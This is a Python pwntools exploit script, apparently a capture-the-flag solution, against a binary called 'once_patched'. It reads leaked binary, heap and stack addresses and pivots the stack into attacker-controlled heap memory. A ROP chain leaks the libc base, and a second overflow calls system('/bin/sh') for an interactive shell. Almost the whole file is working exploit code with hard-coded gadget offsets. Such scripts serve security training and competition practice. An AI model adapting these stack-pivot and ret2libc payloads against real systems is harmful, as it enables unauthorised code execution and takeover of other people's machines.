#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import re

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './once_patched'
context.terminal = ['tmux', 'new-window']
argv = []
env = {}
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
#breakrva 0x1345
gdbscript = '''
break system
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

pattern = r'([0-9a-fA-F]+)'

once = io.recvline().decode()
once = [int(x, 16) for x in re.findall(pattern, once)]
once = once[1:]
print("Once: " + " ".join(hex(x) for x in once))

bin_base = once[0]

heap = io.recvline().decode()
heap = [int(x, 16) for x in re.findall(pattern, heap)]
heap = heap[1:]
print("Heap: " + " ".join(hex(x) for x in heap))

heap_base = heap[0]

stack = io.recvline().decode()
stack = [int(x, 16) for x in re.findall(pattern, stack)]
stack = stack[1:]

print("Stack: " + " ".join(hex(x) for x in stack))

my_input = heap_base + 0x18a0 + 0x10 # remote

print("Heap my input: ", hex(my_input))
rsp_begin = stack[1] - 0x1640

print("RSP begin: ", hex(rsp_begin))

# pivot to heap
payload = p64(my_input)
payload += p64(bin_base + 0x1312) #nop; leave; ret
payload += p64(my_input + 0x80) # rbp

# set up stackframe so that provide_little_help
# searches for libc and prints out its address
payload += p64(bin_base + 0x11ed)
payload += b"B"*0x30
payload += p64(my_input + 0x50)
payload += p64(0)

# libc specific values (simply providing "libc" string didn't work for some reason)
# payload +=b"14300" # local
payload +=b"26000" # remote
payload += p64(0)
payload += b"B"*35

# return to main fread in order to get stdin
# pointer onto our fake heap stack
payload += p64(my_input)
payload += p64(bin_base + 0x1323)

# return to fgets in provide_little_help func
# passing in the stdin ptr on our fake heap stack
print("Stdin ptr ?: ", hex(my_input + 0x8+0x18))
#payload += p64(bin_base + 0x4020+0x18) #rbp, fread
payload += p64(my_input + 0x8 +0x18)
payload += p64(bin_base + 0x126a)

print("payload len: ", hex(len(payload)))

io.send(payload)

io.recvuntil("26000: ") # remote
#io.recvuntil("14300: ")

libc.address = int(io.recv(12), 0x10)
print("Leak: ", hex(libc.address))

# overflow a buffer somewhere in fgets call and win
payload = b"A"*0x10
payload += p64(my_input -0x100)
payload += p64(libc.address+0x27456) # ret
payload += p64(libc.address + 0x27ab5) #pop rdi; ret
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym['system'])
payload += b"A"*0x8

#gdb.attach(io, gdbscript)

io.sendline(payload)

io.interactive()
